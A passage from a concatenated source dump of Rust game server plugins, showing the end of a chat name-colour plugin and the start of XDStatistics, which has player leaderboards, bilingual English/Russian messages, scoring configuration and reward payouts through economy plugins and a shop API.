                string message = string.Format("<color=" + storedData.colour[player.userID] + ">" + player.displayName + "</color>: " + arg.GetString(0, "text"));
                foreach (BasePlayer bp in BasePlayer.activePlayerList)
                    rust.SendChatMessage(bp, message, null, player.userID.ToString());
                Interface.Oxide.ServerConsole.AddMessage("[CHAT] " + player.displayName + ": " + arg.GetString(0, "text"));
                return true;
            }
            else return null;
        }

        [ChatCommand("colour")]
        private void ColourCmd(BasePlayer player, string command, string[] args)
        {
            if (!permission.UserHasPermission(player.userID.ToString(), "colourednames.colouredName")) SendReply(player, "<color=red>You do not have permission!</color>");
            else if (args.Length == 0) SendReply(player, "<color=aqua>Incorrect syntax!</color><color=orange> /colour {colour}.\nFor a more information do /colours.</color>");
            else
            {
                if (!storedData.colour.ContainsKey(player.userID)) storedData.colour.Add(player.userID, args[0]);
                else if (storedData.colour.ContainsKey(player.userID)) storedData.colour[player.userID] = args[0];

                if (args[0] == "clear") SendReply(player, "<color=aqua>ColouredNames: </color><color=orange>Name colour removed!</color>");
                else SendReply(player, "<color=aqua>ColouredNames: </color><color=orange>Name colour changed to </color><color={0}>{0}</color><color=orange>!</color>", args[0]);

                Interface.GetMod().DataFileSystem.WriteObject("ColouredNames", storedData);
            }
        }

        [ChatCommand("colours")]
        private void ColoursCmd(BasePlayer player, string command, string[] args) =>  
            SendReply(player, @"<color=aqua>ColouredNames:</color><color=orange> You may use any colour used in HTML.
                                Eg: ""</color><color=red>red</color><color=orange>"", ""</color><color=blue>blue</color><color=orange>"", ""</color><color=green>green</color><color=orange>"" etc.
                                Or you may use any hex code, eg ""</color><color=#FFFF00>#FFFF00</color><color=orange>"".
                                To remove your colour, use ""clear"".
                                An invalid colour will default to </color>white<color=orange>.</color>");
    }

}


// --- End of file: ColouredNames.cs ---
// --- Next file ---

// --- GitHub Source URL: https://github.com/RustyyTown/plugins/blob/main/XDStatistics.cs ---
// --- Original Local Path: XDStatistics.cs ---

﻿using UnityEngine;
using System;
using Oxide.Game.Rust.Cui;
using System.Collections.Generic;
using Oxide.Core;
using Oxide.Core.Plugins;
using Newtonsoft.Json;
using System.Linq;
using Newtonsoft.Json.Linq;
using Rust;
using System.Text;
using System.Globalization;

namespace Oxide.Plugins
{
    [Info("XDStatistics", "DezLife", "1.9.33")]
    [Description("Multifunctional statistics for your server!")]
    class XDStatistics : RustPlugin
    {
        /// <summary>
        /// Теперь награды выдаются сразу после вайпа
        /// Правки в UI фаворитного оружия
        /// Теперь очки за добычу считаются за последний удар по камню. (ранее считался каждый удар)
        /// Добавлена команда для начислени/удаления очков
        /// Разделил файлы даты, для удобства (Перед загрузкой плагина нужно удалить дата файл)
        /// Добавлена возможность награждать игроков в категории 'Убийца нпс'
        /// Для PVE серверов добавлена функция в конфиги которую нужно активировать
        /// Исправления небольших проблем
        /// Теперь с разрешением 'XDStatistics.admin' игрок сможет смотреть скрытую статистику
        /// Теперь для магазина GAMESTORE - Можно указывать сообщения для истории в магазине
        /// Добавлена возможность импользовать свое изображения для заднего фона
        /// </summary>

         #region ReferencePlugins
        [PluginReference] Plugin ImageLibrary, Friends, Clans, Battles, Duel, Economics, IQEconomic, ServerRewards, GameStoresRUST, RustStore;
        private bool IsFriends(ulong userID, ulong targetID)
        {
            if (Friends)
                return (bool)Friends?.Call("HasFriend", userID, targetID);
            else if (RelationshipManager.ServerInstance.playerToTeam.ContainsKey(userID) && RelationshipManager.ServerInstance.playerToTeam[userID].members.Contains(targetID))
                return true;
            else
                return false;
        }

        private bool IsClans(string userID, string targetID)
        {
            if (Clans)
            {
                String TagUserID = (String)Clans?.Call("GetClanOf", userID);
                String TagTargetID = (String)Clans?.Call("GetClanOf", targetID);
                if (TagUserID == null && TagTargetID == null)
                    return false;
                return (bool)(TagUserID == TagTargetID);
            }
            else
                return false;
        }
        private bool IsDuel(ulong userID)
        {
            if (Battles)
                return (bool)Battles?.Call("IsPlayerOnBattle", userID);
            else if (Duel)
                return (bool)Duel?.Call("IsPlayerOnActiveDuel", BasePlayer.FindByID(userID));
            else
                return false;
        }
        private string GetImage(string shortname, ulong skin = 0) => (string)ImageLibrary?.Call("GetImage", shortname, skin);
        private bool AddImage(string url, string shortname, ulong skin = 0) => (bool)ImageLibrary?.Call("AddImage", url, shortname, skin);
        private void SendImage(BasePlayer player, string imageName, ulong imageId = 0) => ImageLibrary?.Call("SendImage", player, imageName, imageId);
        private bool HasImage(string imageName, ulong imageId = 0) => (bool)ImageLibrary.Call("HasImage", imageName, imageId);

        #endregion

        #region Var
        private static XDStatistics _;
        private readonly string permAdmin = "XDStatistics.admin";
        private readonly string permReset = "XDStatistics.reset";
        private readonly string permAvailability = "XDStatistics.availability";
        private enum CatType
        {
            score,
            killer,
            time,
            farm,
            raid,
            killerNPC
        }
        private Dictionary<string, ItemDisplayName> ItemName = new Dictionary<string, ItemDisplayName>();
        private List<items> ItemList = new List<items>();
        public static StringBuilder sb;
        private Dictionary<uint, string> prefabID2Item = new Dictionary<uint, string>();
        private Dictionary<string, string> prefabNameItem = new Dictionary<string, string>()
        {
            ["40mm_grenade_he"] = "multiplegrenadelauncher",
            ["grenade.beancan.deployed"] = "grenade.beancan",
            ["grenade.f1.deployed"] = "grenade.f1",
            ["explosive.satchel.deployed"] = "explosive.satchel",
            ["explosive.timed.deployed"] = "explosive.timed",
            ["rocket_basic"] = "ammo.rocket.basic",
            ["rocket_hv"] = "ammo.rocket.hv",
            ["rocket_fire"] = "ammo.rocket.fire",
            ["survey_charge.deployed"] = "surveycharge"
        };
        private List<int> AlowedSeedId = new List<int>(){ 1548091822, 1771755747, 1112162468, 1367190888,858486327,-1962971928, -2086926071, -567909622, 1272194103, 854447607,1660145984, 1783512007, -858312878 };
        #endregion

        #region Lang
        protected override void LoadDefaultMessages()
        {
            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["STAT_TOP_FIVE_KILL"] = "<size=16>Top 5 <color=#4286f4>Killers</color>\n{0}</size>",
                ["STAT_TOP_FIVE_KILL_NPC"] = "<size=16>Top 5 <color=#4286f4>NPC killers</color>\n{0}</size>",
                ["STAT_TOP_FIVE_FARM"] = "<size=16>Top 5 <color=#4286f4>Farmers</color>\n{0}</size>",
                ["STAT_TOP_FIVE_EXPLOSION"] = "<size=16>Top 5 <color=#4286f4>Explosions</color>\n{0}</size>",
                ["STAT_TOP_FIVE_TIMEPLAYED"] = "<size=16>Top 5 <color=#4286f4>Most Time Played</color>\n{0}</size>",
                ["STAT_TOP_FIVE_BUILDINGS"] = "<size=16>Top 5 <color=#4286f4>Builders</color>\n{0}</size>",
                ["STAT_TOP_FIVE_SCORE"] = "<size=16>Top 5 <color=#4286f4>Most points</color>\n{0}</size>",
                ["STAT_TOP_FIVE_FERMER"] = "<size=16>Top 5 <color=#4286f4>Farmers</color>\n{0}</size>",
                ["STAT_USER_TOTAL_GATHERED"] = "Total Gathered:",
                ["STAT_USER_TOTAL_EXPLODED"] = "Total Explosions:",
                ["STAT_USER_TOTAL_GROWED"] = "Total Farmed:",
                ["STAT_UI_MY_STAT"] = "My Statistics",
                ["STAT_UI_TOP_TEN"] = "Top 10 Players",
                ["STAT_UI_SEARCH"] = "Search",
                ["STAT_UI_INFO"] = "Player Information {0}",
                ["STAT_UI_ACTIVITY"] = "Activity",
                ["STAT_UI_ACTIVITY_TODAY"] = "Today: {0}",
                ["STAT_UI_ACTIVITY_TOTAL"] = "All Time: {0}",
                ["STAT_UI_SETTINGS"] = "Settings",
                ["STAT_UI_PLACE_TOP"] = "Place On Top: {0}",
                ["STAT_UI_SCORE"] = "Score: {0}",
                ["STAT_UI_PVP"] = "PvP Statistics",
                ["STAT_UI_FAVORITE_WEAPON"] = "Favorite Weapon",
                ["STAT_UI_PVP_KILLS"] = "Kills",
                ["STAT_UI_PVP_KILLS_NPC"] = "Kills NPC",
                ["STAT_UI_PVP_DEATH"] = "Deaths",
                ["STAT_UI_PVP_KDR"] = "K/D",
                ["STAT_UI_FAVORITE_WEAPON_KILLS"] = "Kills: {0} \n Hits: {1}",
                ["STAT_UI_FAVORITE_WEAPON_NOT_DATA"] = "Data is still being calculated..",
                ["STAT_UI_OTHER_STAT"] = "Other Statistics",
                ["STAT_UI_HIDE_STAT"] = "Public Profile",
                ["STAT_UI_CONFIRM"] = "Are You Sure?",
                ["STAT_UI_CONFIRM_YES"] = "Yes",
                ["STAT_UI_CONFIRM_NO"] = "No",
                ["STAT_UI_RESET_STAT"] = "Reset Statistics",
                ["STAT_UI_CRATE_OPEN"] = "Crates Opened: {0}",
                ["STAT_UI_BARREL_KILL"] = "Barrels Destroyed: {0}",
                ["STAT_UI_ANIMAL_KILL"] = "Animal Kills: {0}",
                ["STAT_UI_HELI_KILL"] = "Helicopter Kills: {0}",
                ["STAT_UI_BRADLEY_KILL"] = "Bradley Kills: {0}",
                ["STAT_UI_NPC_KILL"] = "NPC Kills: {0}",
                ["STAT_UI_BTN_MORE"] = "Show More",
                ["STAT_UI_CATEGORY_GATHER"] = "Gather",
                ["STAT_UI_CATEGORY_EXPLOSED"] = "Explosions",
                ["STAT_UI_CATEGORY_PLANT"] = "Farming",
                ["STAT_UI_CATEGORY_TOP_KILLER"] = "Top 10 Killers",
                ["STAT_UI_CATEGORY_TOP_KILLER_ANIMALS"] = "Top 10 Animal Killers",
                ["STAT_UI_CATEGORY_TOP_NPCKILLER"] = "Top 10 NPC Killers",
                ["STAT_UI_CATEGORY_TOP_TIME"] = "Top 10 Most Time Played",
                ["STAT_UI_CATEGORY_TOP_GATHER"] = "Top 10 Gatherers",
                ["STAT_UI_CATEGORY_TOP_SCORE"] = "Top 10 Most Score",
                ["STAT_UI_CATEGORY_TOP_EXPLOSED"] = "Top 10 Explosions",
                ["STAT_PRINT_WIPE"] = "Wipe Detected. Data was successfully cleared!",
                ["STAT_CMD_1"] = "No Permission!!",
                ["STAT_CMD_2"] = "Usage: stat.ignore <add/remove> <Steam ID|Name>",
                ["STAT_CMD_3"] = "The specified playername could not be found. Please use their SteamID.",
                ["STAT_CMD_4"] = "Found several players with similar names: {0}",
                ["STAT_CMD_5"] = "Player not found!",
                ["STAT_CMD_6"] = "Player {0} is already ignored",
                ["STAT_CMD_7"] = "You have successfully added a player {0} to the ignore list",
                ["STAT_CMD_8"] = "The player {0} is not in the ignore list",
                ["STAT_CMD_9"] = "You have successfully removed the player {0} from the ignore list",
                ["STAT_CMD_10"] = "Player {0} successfully credited {1} score",
                ["STAT_CMD_11"] = "Player {0} successfully removed {1} score",
                ["STAT_ADMIN_HIDE_STAT"] = "You've been added to the ignore list. You will not have access to the statistics. If this is an error, Please contact the Administrator!",
                ["STAT_TOP_PLAYER_WIPE_SCORE"] = "Congratulations!\nYou successfully held the {0} position in the previous wipe in the category <color=#4286f4>HIGHEST SCORE</color>\nYou received a well deserved Reward!",
                ["STAT_TOP_PLAYER_WIPE_TIME"] = "Congratulations!\nYou successfully held the {0} position in the previous wipe in the category <color=#4286f4>MOST TIME PLAYED</color>\nYou received a well deserved Reward!",
                ["STAT_TOP_PLAYER_WIPE_EXP"] = "Congratulations!\nYou successfully held the {0} position in the previous wipe in the category <color=#4286f4>MOST EXPLOSIONS</color>\nYou received a well deserved Reward!",
                ["STAT_TOP_PLAYER_WIPE_FARM"] = "Congratulations!\nYou successfully held the {0} position in the previous wipe in the category <color=#4286f4>MOST CROPS FARMED</color>\nYou received a well deserved Reward!",
                ["STAT_TOP_PLAYER_WIPE_KILL"] = "Congratulations!\nYou successfully held the {0} position in the previous wipe in the category <color=#4286f4>MOST KILLS</color>\nYou received a well deserved Reward!",
                ["STAT_TOP_PLAYER_WIPE_KILL_NPC"] = "Congratulations!\nYou successfully held the {0} position in the previous wipe in the category <color=#4286f4>NPC Killer</color>\nYou received a well deserved Reward!",
                ["STAT_TOP_VK_SCORE"] = "Топ {0} игрока по очкам\n {1}",
                ["STAT_TOP_VK_KILLER"] = "Топ {0} игрока по убийствам\n {1}",
                ["STAT_TOP_VK_TIME"] = "Топ {0} игрока по онлайну\n {1}",
                ["STAT_TOP_VK_FARM"] = "Топ {0} игрока по фарму\n {1}",
                ["STAT_TOP_VK_RAID"] = "Топ {0} игрока по рейдам\n {1}",
                ["STAT_TOP_VK_KILLER_NPC"] = "Топ {0} игрока по убийствам NPC\n {1}",

            }, this);

            lang.RegisterMessages(new Dictionary<string, string>
            {
                ["STAT_TOP_FIVE_KILL"] = "<size=16>Топ 5 <color=#4286f4>киллеры</color>\n{0}</size>",
                ["STAT_TOP_FIVE_KILL_NPC"] = "<size=16>Топ 5 <color=#4286f4>убийцы NPC</color>\n{0}</size>",
                ["STAT_TOP_FIVE_FARM"] = "<size=16>Топ 5 <color=#4286f4>фармеры</color>\n{0}</size>",
                ["STAT_TOP_FIVE_EXPLOSION"] = "<size=16>Топ 5 <color=#4286f4>рейдеры</color>\n{0}</size>",
                ["STAT_TOP_FIVE_TIMEPLAYED"] = "<size=16>Топ 5 <color=#4286f4>долгожителей</color>\n{0}</size>",
                ["STAT_TOP_FIVE_BUILDINGS"] = "<size=16>Топ 5 <color=#4286f4>строители</color>\n{0}</size>",
                ["STAT_TOP_FIVE_SCORE"] = "<size=16>Топ 5 по <color=#4286f4>очкам</color>\n{0}</size>",
                ["STAT_TOP_FIVE_FERMER"] = "<size=16>Топ 5 <color=#4286f4>фермеров</color>\n{0}</size>",
                ["STAT_USER_TOTAL_GATHERED"] = "Всего добыто:",
                ["STAT_USER_TOTAL_EXPLODED"] = "Всего взорвано:",
                ["STAT_USER_TOTAL_GROWED"] = "Всего выращено:",
                ["STAT_UI_MY_STAT"] = "Моя Статистика",
                ["STAT_UI_TOP_TEN"] = "Топ 10 игроков",
                ["STAT_UI_SEARCH"] = "Поиск",
                ["STAT_UI_INFO"] = "Информация о профиле {0}",
                ["STAT_UI_ACTIVITY"] = "Активность",
                ["STAT_UI_ACTIVITY_TODAY"] = "Сегодня: {0}",
                ["STAT_UI_ACTIVITY_TOTAL"] = "За все время: {0}",
                ["STAT_UI_SETTINGS"] = "Настройки",
                ["STAT_UI_PLACE_TOP"] = "Место в топе: {0}",
                ["STAT_UI_SCORE"] = "SCORE: {0}",
                ["STAT_UI_PVP"] = "PVP статистика",
                ["STAT_UI_FAVORITE_WEAPON"] = "Фаворитное оружие",
                ["STAT_UI_PVP_KILLS"] = "Убийств",
                ["STAT_UI_PVP_KILLS_NPC"] = "Убийств NPC",
                ["STAT_UI_PVP_DEATH"] = "Смертей",
                ["STAT_UI_PVP_KDR"] = "K/D",
                ["STAT_UI_FAVORITE_WEAPON_KILLS"] = "Убийств: {0} \n Попаданий: {1}",
                ["STAT_UI_FAVORITE_WEAPON_NOT_DATA"] = "Данные еще собираются...",
                ["STAT_UI_OTHER_STAT"] = "Другая статистика",
                ["STAT_UI_HIDE_STAT"] = "Общедоступный профиль",
                ["STAT_UI_CONFIRM"] = "Вы уверены ?",
                ["STAT_UI_CONFIRM_YES"] = "Да",
                ["STAT_UI_CONFIRM_NO"] = "Нет",
                ["STAT_UI_RESET_STAT"] = "Обнулить статистику",
                ["STAT_UI_CRATE_OPEN"] = "Открыто ящиков: {0}",
                ["STAT_UI_BARREL_KILL"] = "Разбито бочек: {0}",
                ["STAT_UI_ANIMAL_KILL"] = "Убито животных: {0}",
                ["STAT_UI_HELI_KILL"] = "Сбито вертолетов: {0}",
                ["STAT_UI_BRADLEY_KILL"] = "Танков уничтожено: {0}",
                ["STAT_UI_NPC_KILL"] = "Убито NPC: {0}",
                ["STAT_UI_BTN_MORE"] = "Показать еще",
                ["STAT_UI_CATEGORY_GATHER"] = "Добыча",
                ["STAT_UI_CATEGORY_EXPLOSED"] = "Взрывчатка",
                ["STAT_UI_CATEGORY_PLANT"] = "Фермерство",
                ["STAT_UI_CATEGORY_TOP_KILLER"] = "Топ 10 киллеров",
                ["STAT_UI_CATEGORY_TOP_KILLER_ANIMALS"] = "Топ 10 убийц животных",
                ["STAT_UI_CATEGORY_TOP_NPCKILLER"] = "Топ 10 убийц npc",
                ["STAT_UI_CATEGORY_TOP_TIME"] = "Топ 10 по онлайну",
                ["STAT_UI_CATEGORY_TOP_GATHER"] = "Топ 10 фармил",
                ["STAT_UI_CATEGORY_TOP_SCORE"] = "Топ 10 по очкам",
                ["STAT_UI_CATEGORY_TOP_EXPLOSED"] = "Топ 10 рейдеров",
                ["STAT_PRINT_WIPE"] = "Произошел вайп. Данные успешно удалены!",
                ["STAT_CMD_1"] = "Недостаточно прав!",
                ["STAT_CMD_2"] = "Используйте: stat.ignore <add/remove> <Steam ID|Имя>",
                ["STAT_CMD_3"] = "Указанный игрок не найден. Для более точного поиска укажите его SteamID.",
                ["STAT_CMD_4"] = "Найдено несколько игроков с похожим именем: {0}",
                ["STAT_CMD_5"] = "Игрок не найден!",
                ["STAT_CMD_6"] = "Игрок {0} уже игнорируется",
                ["STAT_CMD_7"] = "Вы успешно добавили игрока {0} в игнор лист",
                ["STAT_CMD_8"] = "Игрока {0} нет в списке игнорируемых",
                ["STAT_CMD_9"] = "Вы успешно убрали игрока {0} из игнор листа",
                ["STAT_CMD_10"] = "Игроку {0} успешно зачислено {1} очков",
                ["STAT_CMD_11"] = "Игроку {0} успешно снято {1} очков",
                ["STAT_ADMIN_HIDE_STAT"] = "Вы добавлены в игнор лист. У вас нет доступа к статистики, если это ошибка, свяжитесь с администратором!",
                ["STAT_TOP_PLAYER_WIPE_SCORE"] = "Поздравляю!\nВ прошлом вайпе вы успешно удерживали {0} позицию в категории <color=#4286f4>SCORE</color>\nВы заслужено получаете награду!",
                ["STAT_TOP_PLAYER_WIPE_TIME"] = "Поздравляю!\nВ прошлом вайпе вы успешно удерживали {0} позицию в категории <color=#4286f4>Долгожитель</color>\nВы заслужено получаете награду!",
                ["STAT_TOP_PLAYER_WIPE_EXP"] = "Поздравляю!\nВ прошлом вайпе вы успешно удерживали {0} позицию в категории <color=#4286f4>Рейдер</color>\nВы заслужено получаете награду!",
                ["STAT_TOP_PLAYER_WIPE_FARM"] = "Поздравляю!\nВ прошлом вайпе вы успешно удерживали {0} позицию в категории <color=#4286f4>Добытчик</color>\nВы заслужено получаете награду!",
                ["STAT_TOP_PLAYER_WIPE_KILL"] = "Поздравляю!\nВ прошлом вайпе вы успешно удерживали {0} позицию в категории <color=#4286f4>Киллер</color>\nВы заслужено получаете награду!",
                ["STAT_TOP_PLAYER_WIPE_KILL_NPC"] = "Поздравляю!\nВ прошлом вайпе вы успешно удерживали {0} позицию в категории <color=#4286f4>Убийца нпс</color>\nВы заслужено получаете награду!",
                ["STAT_TOP_VK_SCORE"] = "Топ {0} игрока по очкам\n {1}",
                ["STAT_TOP_VK_KILLER"] = "Топ {0} игрока по убийствам\n {1}",
                ["STAT_TOP_VK_TIME"] = "Топ {0} игрока по онлайну\n {1}",
                ["STAT_TOP_VK_FARM"] = "Топ {0} игрока по фарму\n {1}",
                ["STAT_TOP_VK_RAID"] = "Топ {0} игрока по рейдам\n {1}",
                ["STAT_TOP_VK_KILLER_NPC"] = "Топ {0} игрока по убийствам NPC\n {1}",
            }, this, "ru");
        }

        #endregion

        #region Configuration
        private Configuration config;

        private class Configuration
        {
            public class SettingsInterface
            {
                [JsonProperty("Цвет плашки заднего фона в топ 10 за 1 место | Background color in the top 10 for 1st place")]
                public string ColorTop1 = "1 0.8431373 0 0.49";
                [JsonProperty("Цвет плашки заднего фона в топ 10 за 2 место | Background color in the top 10 for 2st place")]
                public string ColorTop2 = "0.7529412 0.7529412 0.7529412 0.49";
                [JsonProperty("Цвет плашки заднего фона в топ 10 за 3 место | Background color in the top 10 for 3st place")]
                public string ColorTop3 = "0.803922835 0.49803 0.1960784 0.49";
                [JsonProperty("Использовать свой задний фон ? (указанный снизу)| Use your own background ? (indicated at the bottom)")]
                public bool UsebackgroundImageUrl = false;
                [JsonProperty("Ссылка на свой задний фон (Если нужно) | Link to your background (If necessary)")]
                public string backgroundImageUrl = "";

            }
            public class Settings
            {
                [JsonProperty("Чат команда для открытия статистики | Chat command for opening statistics")]
                public string chatCommandOpenStat = "stat";
                [JsonProperty("Консольная команда для открытия статистики | Console command to open statistics")]
                public string consoleCommandOpenStat = "stat";
                [JsonProperty("Отправлять в чат сообщения с топ 5 игроками в разных категориях | Send chat messages with top 5 players in different categories")]
                public bool chatSendTop = true;
                [JsonProperty("Раз в сколько секунд будет отправлятся сообщение ? | Once in how many seconds will a message be sent ?")]
                public int chatSendTopTime = 600;
                [JsonProperty("Включить возможность сбросить свою статистику ? (требуется XDStatistics.reset) | Enable the ability to reset your stats ? (requires XDStatistics.reset)")]
                public bool dropStatUse = false;
                [JsonProperty("Включить возможность скрыть свою статистику от пользователей ? (требуется XDStatistics.availability) | Enable the ability to hide your statistics from users ? (requires XDStatistics.availability)")]
                public bool availabilityUse = true;
                [JsonProperty("очищать данные при вайпе | Clear data when wiped")]
                public bool wipeData = true;
                [JsonProperty("Раз во сколько минут будут сохранятся данные | Once in a rowman, the data will be saved.")]
                public int dataSaveTime = 30;
                [JsonProperty("Учитывать убийство npc для фаворитного оружия ? | Consider killing an NPC for a favorite weapon ?")]
                public bool npsDeathUse = false;
                [JsonProperty("У вас PVE сервер ?  | You have a PVE server?")]
                public bool pveServerMode = false;
            }
            public class SettingsScore
            {
                [JsonProperty("Очки за крафт | Points for crafting")]
                public float craftScore = 1;
                [JsonProperty("Очки за бочки | Points for barrels")]
                public float barrelScore = 1;
                [JsonProperty("Очки за установку строительных блоков | Points for installing building blocks")]
                public float BuildingScore = 1;
                [JsonProperty("Очки за использования взрывчатых предметов | Points for using explosive items")]
                public Dictionary<string, float> ExplosionScore = new Dictionary<string, float>();
                [JsonProperty("Очки за добычу ресурсов | Points for resource extraction")]
                public Dictionary<string, float> GatherScore = new Dictionary<string, float>();
                [JsonProperty("Очки за найденные скрап | Points for found scraps")]
                public float ScrapScore = 0.5f;
                [JsonProperty("Очки за сбор урожая (с плантации) | Points for harvesting (from the plantation)")]
                public float PlantScore = 0.2f;
                [JsonProperty("Очки за убийство животных | Points for killing animals")]
                public float AnimalScore = 1;
                [JsonProperty("Очки за сбитие вертолета | Points for shooting down a helicopter")]
                public float HeliScore = 5;
                [JsonProperty("Очки за взрыв танка | Points for tank explosion")]
                public float BradleyScore = 5;
                [JsonProperty("Очки за убийство нпс | Points for killing NPCs")]
                public float NpcScore = 5;
                [JsonProperty("Очки за убийство игроков | Points for killing players")]
                public float PlayerScore = 10;
                [JsonProperty("Очки за время (За кажду. минуту игры на сервере) | Points for time (for every minute of the game on the server)")]
                public float TimeScore = 0.2f;
                [JsonProperty("Сколько отнять очков за суицид ? | How many points to take away for suicide ?")]
                public float SuicideScore = 2;
                [JsonProperty("Сколько отнять очков за смерть ? | How many points to take away for death ?")]
                public float DeathScore = 1;
            }
            public class SettingsPrize
            {
                [JsonProperty("Использовать выдачу награды после вайпа ? | Use the award issue after the wipe ?")]
                public bool prizeUse = false;
                [JsonProperty("Награда в категории SCORE | Award in the SCORE category")]
                public List<Prize> prizeScore = new List<Prize>();
                [JsonProperty("Награда в категории Киллер | Award in the Killer category")]
                public List<Prize> prizeKiller = new List<Prize>();
                [JsonProperty("Награда в категории Фармила | Award in the gathering category")]
                public List<Prize> prizeFarm = new List<Prize>();
                [JsonProperty("Награда в категории рейдер | Reward in the Raider category")]
                public List<Prize> prizeRaid = new List<Prize>();
                [JsonProperty("Награда в категории Большой онлайн | Award in the Big Online category")]
                public List<Prize> prizeTime = new List<Prize>();
                [JsonProperty("Награда в категории Убийца НПС | Reward in the NPC Killer category")]
                public List<Prize> prizeNPCKiller = new List<Prize>();
                [JsonProperty("[RU][GameStores] ID магазина")]
                public string ShopID = "";
                [JsonProperty("[RU][GameStores] ID сервера")]
                public string ServerID = "";
                [JsonProperty("[RU][GameStores] Секретный ключ")]
                public string SecretKey = "";
                internal class Prize
                {
                    [JsonProperty("Использовать комманды в виде приза ? | Use command as a prize ?")]
                    public bool commandPrizeUse = true;
                    [JsonProperty("За какое место давать эту награду ? (от 1 до 3) если не нужно награждать эту категорию. удалите все награды | For which place to give this award ? (from 1 to 3) if you do not need to award this category. remove all rewards")]
                    public int top = 1;
                    [JsonProperty("[RU]Использовать магазин GameStore для выдачи награды")]
                    public bool gamestorePrizeUse = false;
                    [JsonProperty("[RU]Использовать магазин MoscowOVH для выдачи награды")]
                    public bool ovhPrizeUse = false;
                    [JsonProperty("Использовать [IQEconomic или Economics или ServerRewards] для выдачи награды | Use [IQEconomic or Economics or Server Rewards] to issue a reward")]
                    public bool economicPrizeUse = false;
                    [JsonProperty("Команды для приза | Command for the prize")]
                    public List<string> commandPrizeList = new List<string>();
                    [JsonProperty("[RU][GameStores] Сообщения для истории в магазине")]
                    public string balancePlusMess = "За топ 1!!!";
                    [JsonProperty("[RU][GameStores или MoscowOVH] Сколько начислять денег на баланс")]
                    public int balancePlus = 30;
                    [JsonProperty("[IQEconomic или Economics или ServerRewards] Сколько начислять денег на баланс | [IQEconomic or Economics or ServerRewards] How much money to add to the balance")]
                    public int balanceEconomicsPlus = 100;

                    public void GiftPrizePlayer(string player)
                    {
                        if (commandPrizeUse)
                        {
                            foreach (string cmd in commandPrizeList)
                                _.Server.Command(cmd.Replace("%STEAMID%", player));
                        }
                        if (gamestorePrizeUse && _?.GameStoresRUST)
                        {
                            _.webrequest.Enqueue(
                           $"https://gamestores.ru/api?shop_id={_.config.settingsPrize.ShopID}&secret={_.config.settingsPrize.SecretKey}&server={_.config.settingsPrize.ServerID}&action=moneys&type=plus&steam_id={player}&amount={balancePlus}&mess={balancePlusMess}",
                           "", (code, response) =>
                           {
                               switch (code)
                               {
                                   case 0:
                                       {
                                           _.PrintError("Api does not responded to a request");
                                           break;
                                       }
                                   case 200:
                                       {
                                           break;
                                       }
                                   case 404:
                                       {
                                           _.PrintError($"Please check your configuration! {code}");
                                           break;
                                       }
                               }
                           }, _);
                        }
                        if (ovhPrizeUse)
                        {
                            if (_?.RustStore)
                            {
                                _.RustStore.CallHook("APIChangeUserBalance", ulong.Parse(player), balancePlus, new Action<string>(result =>
                                {
                                    if (result == "SUCCESS")
                                        return;
                                    Interface.Oxide.LogDebug($"Баланс игрока {ulong.Parse(player)} не был изменен, ошибка: {result}");
                                }));
                            }
                        }
                        if (economicPrizeUse)
                        {
                            if (_?.Economics)
                            {
                                _.Economics.Call("Deposit", ulong.Parse(player), (double)balanceEconomicsPlus);
                            }
                            else if (_?.IQEconomic)
                            {
                                _.IQEconomic.Call("API_SET_BALANCE", ulong.Parse(player), balanceEconomicsPlus);
                            }
                            else if (_?.ServerRewards)
                            {
                                _.ServerRewards.Call("AddPoints", ulong.Parse(player), balanceEconomicsPlus);
                            }
                        }
                    }

                }
            }

            [JsonProperty("Основные настройки плагина | Basic plugin settings")]
            public Settings settings = new Settings();
            [JsonProperty("Настройка выдачи очков | Setting up the issuance of points")]
            public SettingsScore settingsScore = new SettingsScore();
            [JsonProperty("Настройка награды топ игрокам в каждой категории | Customize rewards for top 1 players in each category")]
            public SettingsPrize settingsPrize = new SettingsPrize();
            [JsonProperty("Настройки интерфейса | Interface Settings")]
            public SettingsInterface settingsInterface = new SettingsInterface();
        }
        protected override void LoadConfig()
        {
            base.LoadConfig();
            try
            {
                config = Config.ReadObject<Configuration>();
                if (config == null)
                    LoadDefaultConfig();
                ValidateConfig();
                SaveConfig();
            }
            catch (JsonException ex)
            {
                Debug.LogException(ex);
                LoadDefaultConfig();
            }
        }

        private void ValidateConfig()
        {
            if (config.settingsScore.GatherScore.Count == 0)
            {
                config.settingsScore.GatherScore = new Dictionary<string, float>
                {
                    ["wood"] = 0.3f,
                    ["stones"] = 0.6f,
                    ["metal.ore"] = 1,
                    ["sulfur.ore"] = 1.5f,
                    ["hq.metal.ore"] = 2,
                };
            }
            if (config.settingsScore.ExplosionScore.Count == 0)
            {
                config.settingsScore.ExplosionScore = new Dictionary<string, float>
                {
                    ["explosive.timed"] = 2,
                    ["explosive.satchel"] = 0.7f,
                    ["grenade.beancan"] = 0.3f,
                    ["grenade.f1"] = 0.1f,
                    ["ammo.rocket.basic"] = 1,
                    ["ammo.rocket.hv"] = 0.5f,
                    ["ammo.rocket.fire"] = 0.7f,
                    ["ammo.rifle.explosive"] = 0.02f,
                };
            }
            if (!config.settingsScore.ExplosionScore.ContainsKey("ammo.rifle.explosive"))
            {
                config.settingsScore.ExplosionScore.Add("ammo.rifle.explosive", 0.02f);
            }

            if (config.settingsPrize.prizeFarm.Count == 0)
            {
                config.settingsPrize.prizeFarm = new List<Configuration.SettingsPrize.Prize>
                {
                    new Configuration.SettingsPrize.Prize{commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 1 в категории фармер" },
                    new Configuration.SettingsPrize.Prize{ top = 2, commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 2 в категории фармер" },
                };
            }
            if (config.settingsPrize.prizeKiller.Count == 0)
            {
                config.settingsPrize.prizeKiller = new List<Configuration.SettingsPrize.Prize>
                {
                    new Configuration.SettingsPrize.Prize{commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 1 в категории киллер" },
                    new Configuration.SettingsPrize.Prize{ top = 2, commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 2 в категории киллер" },
                };
            }
            if (config.settingsPrize.prizeRaid.Count == 0)
            {
                config.settingsPrize.prizeRaid = new List<Configuration.SettingsPrize.Prize>
                {
                    new Configuration.SettingsPrize.Prize{commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 1 в категории рейдер" },
                    new Configuration.SettingsPrize.Prize{ top = 2, commandPrizeList = new List<string>{ "say %STEAMID%" }, balancePlusMess = "За топ 2 в категории рейдер" },
                };
            }
